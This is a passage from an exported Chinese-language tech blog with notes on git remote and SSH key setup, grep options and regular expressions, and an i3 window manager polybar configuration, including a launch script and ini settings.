<h2 id="远程仓库创与推送"><a href="#远程仓库创与推送" class="headerlink" title="远程仓库创与推送"></a>远程仓库创与推送</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote add origin git@github.com:xxx&#x2F;xxx.git    与远程库关联</span><br><span class="line"></span><br><span class="line">git push (-u) origin master   推送 master 分支到远程库</span><br><span class="line"></span><br><span class="line">git clone git@github.com:xxx&#x2F;xxx.git  克隆</span><br><span class="line"></span><br><span class="line">git remote (-v)   查看远程库信息</span><br><span class="line"></span><br><span class="line">git remote rm origin   删除已有的远程库</span><br></pre></td></tr></table></figure>
<h1 id="github配置shh-key"><a href="#github配置shh-key" class="headerlink" title="github配置shh-key"></a>github配置shh-key</h1><p><strong>生成秘钥</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;eonun@qq.com&quot;</span></span><br><span class="line"><span class="comment"># 输入全路径文件名（默认:~/.ssh/id_rsa），输入密码（默认：空），一路回车默认也可</span></span><br><span class="line"><span class="comment"># 生成两个文件：id_rsa 和 id_rsa.pub</span></span><br></pre></td></tr></table></figure>
<p><strong>将秘钥添加到<code>ssh-agent</code></strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-add ~/.ssh/id_rsa</span><br><span class="line">ssh-add -l		<span class="comment"># 显示已添加</span></span><br></pre></td></tr></table></figure>
<p><strong>在<code>Github</code>添加<code>ssh-key</code></strong><br>到github里 <code>Settings</code> &gt; <code>SSH and GPG keys</code> &gt; <code>SSH keys</code> 添加秘钥<br>秘钥内容是<code>xxx_rsa.pub</code>的内容</p>
<p><strong>测试</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><br>出现：</p>
<blockquote>
<p>The authenticity of host ‘github.com (207.97.227.239)’ can’t be established.<br>RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.<br>Are you sure you want to continue connecting (yes/no)?</p>
</blockquote>
<p>输入<code>yse</code>出现：</p>
<blockquote>
<p>Hi eonun! You’ve successfully authenticated, but GitHub does not provide shell access.</p>
</blockquote>
<p>若出现<code>Hi</code>后是用户名，说明成功了</p>
<p><strong>修改<code>.git</code>下<code>config</code>中的<code>url</code></strong><br>修改前：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url &#x3D; https:&#x2F;&#x2F;github.com&#x2F;eonun&#x2F;eonun.github.io.git</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>修改为：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url &#x3D; git@github.com:eonun&#x2F;eonun.github.io.git</span><br></pre></td></tr></table></figure></p>
<h1 id="配置多平台ssh-key"><a href="#配置多平台ssh-key" class="headerlink" title="配置多平台ssh-key"></a>配置多平台ssh-key</h1><p><strong>分别生成<code>shh-key</code></strong><br>或者都使用同一个秘钥<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&#x27;eonun@qq.com&#x27;</span> -f ~/.ssh/gitee_id_rsa</span><br><span class="line">ssh-keygen -t rsa -C <span class="string">&#x27;eonun@qq.com&#x27;</span> -f ~/.ssh/github_id_rsa</span><br><span class="line">ssh-keygen -t rsa -C <span class="string">&#x27;eonun@qq.com&#x27;</span>		<span class="comment">#使用都使用同一个秘钥也可以</span></span><br><span class="line"><span class="comment"># -f 指定秘钥文件</span></span><br></pre></td></tr></table></figure></p>
<p><strong>配置</strong><br>新建<code>~/.ssh/config</code>添加内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># gitee</span><br><span class="line">Host gitee.com</span><br><span class="line">HostName gitee.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;gitee_id_rsa</span><br><span class="line"></span><br><span class="line"># github</span><br><span class="line">Host github.com</span><br><span class="line">HostName github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;github_id_rsa</span><br><span class="line"></span><br><span class="line"># coding</span><br><span class="line">Host eonun.coding.net</span><br><span class="line">HostName eonun.coding.net</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~&#x2F;.ssh&#x2F;id_rsa.pub</span><br></pre></td></tr></table></figure>
<p><code>Host</code>和<code>HostName</code>填写<code>git</code>服务器的域名，<code>IdentityFile</code>指定私钥的路径</p>
<p><strong>测试</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@gitee.com</span><br><span class="line">ssh -T git@github.com</span><br><span class="line">ssh -T git@eonun.coding.net</span><br></pre></td></tr></table></figure></p>
<h1 id="例"><a href="#例" class="headerlink" title="例"></a>例</h1><h2 id="新建仓库"><a href="#新建仓库" class="headerlink" title="新建仓库"></a>新建仓库</h2><p><strong>Code所在根目录执行</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><br><strong>将项目的所有文件添加到仓库中</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add .</span><br></pre></td></tr></table></figure><br><strong>添加README</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add README.md</span><br></pre></td></tr></table></figure><br><strong>提交到仓库</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git commit -m &quot;注释语句&quot;</span><br></pre></td></tr></table></figure><br><strong>将本地的仓库关联到GitHub，改成自己的地址</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote add origin https:&#x2F;&#x2F;github.com&#x2F;xxxxx&#x2F;Test.git</span><br></pre></td></tr></table></figure><br><strong>上传前pull一下</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git pull origin master</span><br></pre></td></tr></table></figure><br><strong>上传代码到远程仓库</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><br>中间可能会让你输入Username和Password，你只要输入github的账号和密码就行了。执行完后，如果没有异常，等待执行完就上传成功了。</p>
<h2 id="更新仓库"><a href="#更新仓库" class="headerlink" title="更新仓库"></a>更新仓库</h2><p><strong>查看当前的git仓库状态</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure><br><strong>更新全部</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add *</span><br></pre></td></tr></table></figure><br><strong>接着添加更新说明</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git commit -m &quot;更新说明&quot;</span><br></pre></td></tr></table></figure><br><strong>先git pull,拉取当前分支最新代码</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git pull</span><br></pre></td></tr></table></figure><br>出现：<code>fatal: 拒绝合并无关的历史</code>时使用<code>--allow-unrelated-histories</code>忽略版本不同造成的影响</p>
<p><strong>push到远程master分支上</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push origin master</span><br></pre></td></tr></table></figure>
<p><strong>不出意外，打开GitHub已经同步了</strong></p>
<h2 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h2><p><strong>查看所有分支</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git branch --all</span><br></pre></td></tr></table></figure><br><strong>重命名git远程分支</strong></p>
<p><strong>1、重命名远程分支对应的本地分支</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git branch -m old_local_branch_name new_local_branch_name</span><br></pre></td></tr></table></figure></p>
<p><strong>2、删除远程分支</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push origin :old_local_branch_name</span><br></pre></td></tr></table></figure></p>
<p><strong>3、重新推送新命名的本地分支</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push origin new_local_branch_name</span><br></pre></td></tr></table></figure></p>
<h1 id="书籍：中文-英文"><a href="#书籍：中文-英文" class="headerlink" title="书籍：中文 英文"></a>书籍：<a href="https://git-scm.com/book/zh/v2">中文</a> <a href="https://git-scm.com/book/en/v2">英文</a></h1>]]></content>
      <categories>
        <category>技能</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>grep高效用法</title>
    <url>/posts/31004ff1/</url>
    <content><![CDATA[<h1 id="grep命令"><a href="#grep命令" class="headerlink" title="grep命令"></a>grep命令</h1><p>  <code>grep</code>是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来</p>
<h2 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h2><a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-a 	不要忽略二进制数据</span><br><span class="line">-A&lt;显示列数&gt; 	同时显示后面的行</span><br><span class="line">-b 	同时显示前面的行</span><br><span class="line">-c 	统计符合范本样式的行数</span><br><span class="line">-C&lt;列数&gt;或-&lt;列数&gt;  	同时显示该前后几列&#x2F;行的内容</span><br><span class="line">-d&lt;动作&gt; 	指定查找目录，必须使用这项参数</span><br><span class="line">-e&lt;样式&gt; 	指定字符串作为查找文件内容的样式</span><br><span class="line">-E 	使用扩展正则表达式，相当于egrep</span><br><span class="line">-f&lt;文件&gt; 	指定文件，可一个或多个</span><br><span class="line">-F 	将样式视为固定字符串的列表</span><br><span class="line">-G 	将样式视为普通的表示法来使用</span><br><span class="line">-h 	不标示该列所属的文件名称</span><br><span class="line">-H 	标示该列的文件名称</span><br><span class="line">-i 	忽略大小写</span><br><span class="line">-l 	列出文件内容符合样式的文件名</span><br><span class="line">-L 	列出文件内容不符合样式的文件名</span><br><span class="line">-n 	显示行号</span><br><span class="line">-q 	不显示任何信息</span><br><span class="line">-r 	递归</span><br><span class="line">-s 	不显示错误信息</span><br><span class="line">-v 	反向查找</span><br><span class="line">-w 	只显示全字符合的行</span><br><span class="line">-x 	只显示全行符合的行</span><br><span class="line">-y 	同“-i”</span><br><span class="line">-o 	只输出文件中匹配到的部分</span><br><span class="line">--color  高亮显示搜索，多数系统默认支持</span><br></pre></td></tr></table></figure>
<h2 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h2><p><strong>输出除搜索的内容外的内容</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -v <span class="string">&quot;搜索的内容&quot;</span> file_name</span><br></pre></td></tr></table></figure>
<p><strong>只输出匹配的内容</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;this is a test line.&quot;</span> | grep -o -E <span class="string">&quot;[a-z]+\.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> this is a <span class="built_in">test</span> line. | egrep -o <span class="string">&quot;[a-z]+\.&quot;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>line.</p>
</blockquote>
<p><strong>显示行号</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;text&quot;</span> -n file_name</span><br></pre></td></tr></table></figure>
<p><strong>在多级目录中对文本进行递归搜索</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;text&quot;</span> /tmp/ -r -n</span><br></pre></td></tr></table></figure></p>
<h2 id="规则表达式"><a href="#规则表达式" class="headerlink" title="规则表达式"></a>规则表达式</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">^    <span class="comment"># 锚定行的开始 如：&#x27;^grep&#x27;匹配所有以grep开头的行。    </span></span><br><span class="line">$    <span class="comment"># 锚定行的结束 如：&#x27;grep$&#x27; 匹配所有以grep结尾的行。</span></span><br><span class="line">.    <span class="comment"># 匹配一个非换行符的字符 如：&#x27;gr.p&#x27;匹配gr后接一个任意字符，然后是p。    </span></span><br><span class="line">*    <span class="comment"># 匹配零个或多个先前字符 如：&#x27;*grep&#x27;匹配所有一个或多个空格后紧跟grep的行。    </span></span><br><span class="line">.*   <span class="comment"># 一起用代表任意字符。   </span></span><br><span class="line">[]   <span class="comment"># 匹配一个指定范围内的字符，如&#x27;[Gg]rep&#x27;匹配Grep和grep。    </span></span><br><span class="line">[^]  <span class="comment"># 匹配一个不在指定范围内的字符，如：&#x27;[^A-FH-Z]rep&#x27;匹配不包含A-R和T-Z的一个字母开头，紧跟rep的行。    </span></span><br><span class="line">\(..\)  <span class="comment"># 标记匹配字符，如&#x27;\(love\)&#x27;，love被标记为1。    </span></span><br><span class="line">\&lt;      <span class="comment"># 锚定单词的开始，如:&#x27;\&lt;grep&#x27;匹配包含以grep开头的单词的行。    </span></span><br><span class="line">\&gt;      <span class="comment"># 锚定单词的结束，如&#x27;grep\&gt;&#x27;匹配包含以grep结尾的单词的行。    </span></span><br><span class="line">x\&#123;m\&#125;  <span class="comment"># 重复字符x，m次，如：&#x27;0\&#123;5\&#125;&#x27;匹配包含5个o的行。    </span></span><br><span class="line">x\&#123;m,\&#125;   <span class="comment"># 重复字符x,至少m次，如：&#x27;o\&#123;5,\&#125;&#x27;匹配至少有5个o的行。    </span></span><br><span class="line">x\&#123;m,n\&#125;  <span class="comment"># 重复字符x，至少m次，不多于n次，如：&#x27;o\&#123;5,10\&#125;&#x27;匹配5--10个o的行。   </span></span><br><span class="line">\w    <span class="comment"># 匹配文字和数字字符，也就是[A-Za-z0-9]，如：&#x27;G\w*p&#x27;匹配以G后跟零个或多个文字或数字字符，然后是p。   </span></span><br><span class="line">\W    <span class="comment"># \w的反置形式，匹配一个或多个非单词字符，如点号句号等。   </span></span><br><span class="line">\b    <span class="comment"># 单词锁定符，如: &#x27;\bgrep\b&#x27;只匹配grep。  </span></span><br></pre></td></tr></table></figure>
<h2 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h2><p><strong>使用扩展正则表达式</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -E <span class="string">&quot;[1-9]&quot;</span></span><br><span class="line"></span><br><span class="line">egrep <span class="string">&quot;[1-9]&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>行前(<code>^</code>) 行尾(<code>$</code>)</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 搜索以某字符串开头</span></span><br><span class="line">grep ^<span class="built_in">test</span> file_name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索以某字符串结尾</span></span><br><span class="line">grep <span class="built_in">test</span>$ file_name</span><br></pre></td></tr></table></figure></p>
<p><strong>任意一个字符(<code>.</code>) 任意多字符(<code>*</code>)</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 以good为例</span></span><br><span class="line">grep go.d file_name</span><br><span class="line"></span><br><span class="line">grep g*d file_name</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>i3-polybar配置美化</title>
    <url>/posts/af56b769/</url>
    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo pacman -S polybar</span><br></pre></td></tr></table></figure>
<h1 id="i3-配置使用-polybar"><a href="#i3-配置使用-polybar" class="headerlink" title="i3 配置使用 polybar"></a>i3 配置使用 polybar</h1><p>编写启动 polybar 的脚本</p>
<figure class="highlight sh"><figcaption><span>.config/polybar/polybar_run.sh</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 终端可能已经有在运行的实例</span></span><br><span class="line">killall -q polybar</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待进程被终止</span></span><br><span class="line"><span class="keyword">while</span> pgrep -u <span class="variable">$UID</span> -x polybar &gt;/dev/null; <span class="keyword">do</span> sleep 1; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行Polybar，使用默认的配置文件路径 ~/.config/polybar/config</span></span><br><span class="line">polybar mybar &amp;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Polybar runing...&quot;</span></span><br></pre></td></tr></table></figure>
<p>注释 i3 自带的 bar 或 i3blocks ，配置使用 polybar 启动脚本启动 polybar</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">#bar &#123;</span></span><br><span class="line"><span class="comment">#	i3bar_command i3bar --transparency</span></span><br><span class="line"><span class="comment">#	status_command i3blocks</span></span><br><span class="line"><span class="comment">#	position top</span></span><br><span class="line"><span class="comment">#	colors &#123;</span></span><br><span class="line"><span class="comment">#		background #9370DB3F</span></span><br><span class="line"><span class="comment">#		separator #778899</span></span><br><span class="line"><span class="comment">#			# 使用RGBA颜色  #边界 背景 文本</span></span><br><span class="line"><span class="comment">#		focused_workspace  	#778899A5 #87CEEBA5 #FFFAFAF5</span></span><br><span class="line"><span class="comment">#		inactive_workspace 	#7788993F #AFEEEE3F #FFFAFAF5</span></span><br><span class="line"><span class="comment">#		urgent_workspace   	#80808072 #FF450072 #FFFAFAF5</span></span><br><span class="line"><span class="comment">#    &#125;</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line">exec_always --no-startup-id $HOME/.config/polybar/polybar_run.sh</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="定义自己的-polybar-配置"><a href="#定义自己的-polybar-配置" class="headerlink" title="定义自己的 polybar 配置"></a>定义自己的 polybar 配置</h1><p>配置文件使用的是 <code>ini</code> 格式编写，具体每个插件查考<a href="https://github.com/polybar/polybar/wiki">官方 wiki</a> 的说明(英文有些吃力就用翻译),也可使用第三方脚本插件。</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment">;==========================================================</span></span><br><span class="line"><span class="comment">;</span></span><br><span class="line"><span class="comment">;</span></span><br><span class="line"><span class="comment">;   ██████╗  ██████╗ ██╗  ██╗   ██╗██████╗  █████╗ ██████╗</span></span><br><span class="line"><span class="comment">;   ██╔══██╗██╔═══██╗██║  ╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗</span></span><br><span class="line"><span class="comment">;   ██████╔╝██║   ██║██║   ╚████╔╝ ██████╔╝███████║██████╔╝</span></span><br><span class="line"><span class="comment">;   ██╔═══╝ ██║   ██║██║    ╚██╔╝  ██╔══██╗██╔══██║██╔══██╗</span></span><br><span class="line"><span class="comment">;   ██║     ╚██████╔╝███████╗██║   ██████╔╝██║  ██║██║  ██║</span></span><br><span class="line"><span class="comment">;   ╚═╝      ╚═════╝ ╚══════╝╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝</span></span><br><span class="line"><span class="comment">;</span></span><br><span class="line"><span class="comment">;</span></span><br><span class="line"><span class="comment">;   https://github.com/polybar/polybar</span></span><br><span class="line"><span class="comment">;   https://github.com/polybar/polybar/wiki</span></span><br><span class="line"><span class="comment">;</span></span><br><span class="line"><span class="comment">;==========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="section">[colors]</span></span><br><span class="line"><span class="comment">;background = $&#123;xrdb:color0:#222&#125;</span></span><br><span class="line">background = #cc222222</span><br><span class="line">background-alt = #444</span><br><span class="line"><span class="comment">;foreground = $&#123;xrdb:color7:#222&#125;</span></span><br><span class="line">foreground = #b6a49b</span><br><span class="line">foreground-alt = #555</span><br><span class="line">primary = #ffb52a</span><br><span class="line">secondary = #e60053</span><br><span class="line">alert = #bd2c40</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">[settings]</span></span><br><span class="line"><span class="attr">screenchange-reload</span> = <span class="literal">true</span></span><br><span class="line"><span class="comment">;compositing-background = xor</span></span><br><span class="line"><span class="comment">;compositing-background = screen</span></span><br><span class="line"><span class="comment">;compositing-foreground = source</span></span><br><span class="line"><span class="comment">;compositing-border = over</span></span><br><span class="line"><span class="comment">;pseudo-transparency = false</span></span><br><span class="line"></span><br><span class="line"><span class="section">[global/wm]</span></span><br><span class="line"><span class="attr">margin-top</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">margin-bottom</span> = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">[bar/mybar]</span></span><br><span class="line"><span class="comment">;monitor = $&#123;env:MONITOR:HDMI-1&#125;</span></span><br><span class="line"><span class="comment">;width = 100%</span></span><br><span class="line"><span class="comment">;height = 25</span></span><br><span class="line"><span class="comment">;offset-x = 1%</span></span><br><span class="line"><span class="comment">;offset-y = 1%</span></span><br><span class="line"><span class="attr">radius</span> = <span class="number">12</span></span><br><span class="line"><span class="attr">fixed-center</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">background</span> = <span class="variable">$&#123;colors.background&#125;</span></span><br><span class="line"><span class="attr">foreground</span> = <span class="variable">$&#123;colors.foreground&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">line-size</span> = <span class="number">4</span></span><br><span class="line">line-color = #f00</span><br><span class="line"></span><br><span class="line"><span class="attr">border-size</span> = <span class="number">4</span></span><br><span class="line">border-color = #00000000</span><br><span class="line"></span><br><span class="line"><span class="attr">padding-left</span> = <span class="number">2</span></span><br><span class="line"><span class="attr">padding-right</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="attr">module-margin-left</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">module-margin-right</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; https://github.com/ryanoasis/nerd-fonts</span></span><br><span class="line"><span class="comment">; https://www.nerdfonts.com/cheat-sheet</span></span><br><span class="line"><span class="attr">font-0</span> = fixed:pixelsize=<span class="number">10</span><span class="comment">;1</span></span><br><span class="line"><span class="attr">font-1</span> = unifont:fontformat=<span class="literal">true</span>type:size=<span class="number">10</span>:antialias=<span class="literal">false</span><span class="comment">;0</span></span><br><span class="line"><span class="attr">font-2</span> = Noto Sans Symbols2:style=Regular:size=<span class="number">12</span></span><br><span class="line"><span class="attr">font-3</span> = Font Awesome <span class="number">5</span> Free:style=Solid:size=<span class="number">12</span></span><br><span class="line"><span class="attr">font-4</span> = Font Awesome <span class="number">5</span> Brands:style=Regular:size=<span class="number">12</span></span><br><span class="line"><span class="attr">font-5</span> = DejaVu Sans:style=Bold:size=<span class="number">12</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">modules-left</span> = menu-apps i3</span><br><span class="line"><span class="comment">;modules-center = mpd</span></span><br><span class="line"><span class="attr">modules-center</span> = wireless-network wired-network cpu memory</span><br><span class="line"><span class="attr">modules-right</span> = system-usb-udev xkeyboard pulseaudio backlight date battery</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">tray-position</span> = right</span><br><span class="line"><span class="attr">tray-padding</span> = <span class="number">2</span></span><br><span class="line"><span class="attr">tray-background</span> = <span class="variable">$&#123;colors.background&#125;</span></span><br><span class="line"><span class="attr">transparent</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">cursor-click</span> = pointer</span><br><span class="line"><span class="attr">cursor-scroll</span> = ns-resize</span><br><span class="line"></span><br><span class="line"><span class="comment">;====================================</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">; ===菜单===</span></span><br><span class="line"><span class="comment">; https://github.com/polybar/polybar/wiki/Module:-menu</span></span><br><span class="line"><span class="section">[module/menu-apps]</span></span><br><span class="line"><span class="attr">type</span> = custom/menu</span><br><span class="line"></span><br><span class="line"><span class="comment">; 若为 true, &lt;label-toggle&gt; 将在左边,若为 false, 将在右边</span></span><br><span class="line"><span class="attr">expand-right</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; menu-LEVEL-N 与 label-NAME 属性相同，并附加 exec 属性</span></span><br><span class="line"><span class="comment">; 命令将使用 /bin/sh -c $COMMAND</span></span><br><span class="line"></span><br><span class="line"><span class="attr">menu-0-0</span> = 浏览器</span><br><span class="line">menu-0-0-exec = #menu-apps.open.1</span><br><span class="line"><span class="attr">menu-0-1</span> = 多媒体</span><br><span class="line">menu-0-1-exec = #menu-apps.open.2</span><br><span class="line"></span><br><span class="line"><span class="attr">menu-1-0</span> =  Firefox</span><br><span class="line"><span class="attr">menu-1-0-exec</span> = firefox</span><br><span class="line"><span class="attr">menu-1-1</span> =  Chromium</span><br><span class="line"><span class="attr">menu-1-1-exec</span> = chromium</span><br><span class="line"></span><br><span class="line"><span class="attr">menu-2-0</span> = Gimp</span><br><span class="line"><span class="attr">menu-2-0-exec</span> = gimp</span><br><span class="line"><span class="attr">menu-2-1</span> = Scrot</span><br><span class="line"><span class="attr">menu-2-1-exec</span> = scrot</span><br><span class="line"></span><br><span class="line"><span class="comment">; &lt;label-toggle&gt; 可替换为 &lt;label-(open|close)&gt;</span></span><br><span class="line"><span class="comment">; 如果 expand-right 为 true ，则默认值为&quot;&lt;label-toggle&gt;&lt;menu&gt;&quot;。注意，如果使用&lt;label-toggle&gt; 就必须定义 &lt;label-open&gt;</span></span><br><span class="line"><span class="comment">; format = &lt;label-toggle&gt; &lt;menu&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">label-open</span> = </span><br><span class="line"><span class="attr">label-close</span> = </span><br><span class="line"></span><br><span class="line"><span class="comment">; 分隔元件</span></span><br><span class="line"><span class="attr">label-separator</span> = |</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">; ===i3 工作区===</span></span><br><span class="line"><span class="comment">; https://github.com/polybar/polybar/wiki/Module:-i3</span></span><br><span class="line"><span class="section">[module/i3]</span></span><br><span class="line"><span class="attr">type</span> = internal/i3</span><br><span class="line"><span class="attr">format</span> = &lt;label-state&gt; &lt;label-mode&gt;</span><br><span class="line"><span class="attr">index-sort</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">wrapping-scroll</span> = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">label-mode-padding</span> = <span class="number">2</span></span><br><span class="line">label-mode-foreground = #000</span><br><span class="line"><span class="attr">label-mode-background</span> = <span class="variable">$&#123;colors.primary&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 聚焦在显示器上的活动工作区</span></span><br><span class="line"><span class="attr">label-focused</span> = %index%</span><br><span class="line"><span class="attr">label-focused-background</span> = <span class="variable">$&#123;colors.background-alt&#125;</span></span><br><span class="line"><span class="attr">label-focused-underline</span>= <span class="variable">$&#123;colors.primary&#125;</span></span><br><span class="line"><span class="attr">label-focused-padding</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 任何显示器上的非活动工作区</span></span><br><span class="line"><span class="attr">label-unfocused</span> = %index%</span><br><span class="line"><span class="attr">label-unfocused-padding</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 未聚焦在显示器生的活动工作区</span></span><br><span class="line"><span class="attr">label-visible</span> = %index%</span><br><span class="line"><span class="attr">label-visible-background</span> = <span class="variable">$&#123;self.label-focused-background&#125;</span></span><br><span class="line"><span class="attr">label-visible-underline</span> = <span class="variable">$&#123;self.label-focused-underline&#125;</span></span><br><span class="line"><span class="attr">label-visible-padding</span> = <span class="variable">$&#123;self.label-focused-padding&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 设置紧急提示的工作区</span></span><br><span class="line"><span class="attr">label-urgent</span> = %index%</span><br><span class="line"><span class="attr">label-urgent-background</span> = <span class="variable">$&#123;colors.alert&#125;</span></span><br><span class="line"><span class="attr">label-urgent-padding</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 工作区之间的分隔符</span></span><br><span class="line"><span class="comment">; label-separator = |</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">; ===网络===</span></span><br><span class="line"><span class="comment">; https://github.com/polybar/polybar/wiki/Module:-network</span></span><br><span class="line"><span class="section">[module/wired-network]</span></span><br><span class="line"><span class="attr">type</span> = internal/network</span><br><span class="line"><span class="attr">interface</span> = enp4s0</span><br><span class="line"><span class="attr">interval</span> = <span class="number">3.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 间隔宽度</span></span><br><span class="line"><span class="attr">udspeed-minwidth</span> = <span class="number">3</span></span><br><span class="line"><span class="comment">; 所以端口累计</span></span><br><span class="line"><span class="attr">accumulate-stats</span> = <span class="literal">true</span></span><br><span class="line"><span class="comment">; 对未知状态的网络设备启用</span></span><br><span class="line"><span class="attr">unknown-as-up</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">format-connected</span> = &lt;label-connected&gt;</span><br><span class="line"><span class="attr">format-disconnected</span> = &lt;label-disconnected&gt;</span><br><span class="line"></span><br><span class="line"><span class="attr">label-connected</span> =   %linkspeed% %upspeed% %downspeed%</span><br><span class="line">label-connected-foreground = #00FFFF</span><br><span class="line"></span><br><span class="line"><span class="comment">;label-disconnected = </span></span><br><span class="line"><span class="comment">;label-disconnected-foreground = #66ffffff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">[module/wireless-network]</span></span><br><span class="line"><span class="attr">type</span> = internal/network</span><br><span class="line"><span class="attr">interface</span> = wlp3s0</span><br><span class="line"></span><br><span class="line"><span class="attr">interval</span> = <span class="number">3.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 间隔宽度</span></span><br><span class="line"><span class="attr">udspeed-minwidth</span> = <span class="number">3</span></span><br><span class="line"><span class="comment">; 所以端口累计</span></span><br><span class="line"><span class="attr">accumulate-stats</span> = <span class="literal">true</span></span><br><span 